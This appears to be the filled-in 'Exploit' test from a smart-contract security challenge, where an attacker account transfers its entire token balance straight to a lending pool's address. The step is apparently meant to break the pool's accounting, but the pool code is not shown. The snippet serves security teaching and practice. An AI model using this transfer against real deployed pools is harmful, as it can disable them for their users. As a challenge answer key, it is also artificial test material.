it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const tokenConnection = await this.token.connect(attacker)
    await tokenConnection.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE)
});
